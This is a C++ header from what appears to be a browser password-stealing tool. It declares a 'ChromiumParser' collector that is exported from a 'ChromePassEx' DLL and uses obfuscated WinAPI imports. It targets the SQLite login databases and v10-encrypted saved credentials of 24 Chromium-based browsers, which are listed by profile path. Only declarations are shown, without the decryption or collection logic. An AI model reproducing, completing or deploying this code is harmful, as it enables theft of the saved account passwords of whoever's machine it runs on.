#pragma once
#include <obfuscator/WinApiImport.h>
#include <sqlite3.h>
#include <string>
#include <vector>

#include "Forwards.h"
#include "ICollector.h"

#ifdef ChromePassEx_EXPORTS

#define EXPORT_F __declspec(dllexport)

	#else

#define EXPORT_F 

#endif


#define V10_LEN 3
#define NONCE_LEN 12



class EXPORT_F ChromiumParser : public ICollector
{
public:
	explicit ChromiumParser()
		
	{
	}

	~ChromiumParser() override;

	List<AccountData> collect_data() override;
	
private:

	void try_collect(const String& chromium_path);	
	bool get_path_to_db(const String& chromium_path);	
	
	char* m_pbOutput = nullptr;
	
	String m_chrome_sqlite_path;
	List<AccountData> m_collected_data;
	
	const List<String> m_chromium_list {
		
		"\\Google\\Chrome",
		"\\Google(x86)\\Chrome",
		"\\Chromium",
		"\\Microsoft\\Edge",
		"\\BraveSoftware\\Brave-Browser",
		"\\Epic Privacy Browser",
		"\\Amigo",
		"\\Vivaldi",
		"\\Orbitum",
		"\\Mail.Ru\\Atom",
		"\\Kometa",
		"\\Comodo\\Dragon",
		"\\Torch",
		"\\Comodo",
		"\\Slimjet",
		"\\360Browser\\Browser",
		"\\Maxthon3",
		"\\K-Melon",
		"\\Sputnik\\Sputnik",
		"\\Nichrome",
		"\\CocCoc\\Browser",
		"\\uCozMedia\\Uran",
		"\\Chromodo",
		"\\Yandex\\YandexBrowser"
	};
};

 

